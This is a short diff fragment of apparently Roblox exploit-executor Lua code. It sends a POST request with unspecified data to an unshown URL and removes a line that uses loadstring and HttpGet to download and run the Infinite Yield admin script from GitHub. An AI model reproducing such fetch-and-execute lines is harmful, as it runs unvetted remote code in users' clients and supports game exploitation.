@@ -84,5 +84,4 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
 wait()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 print("worked")
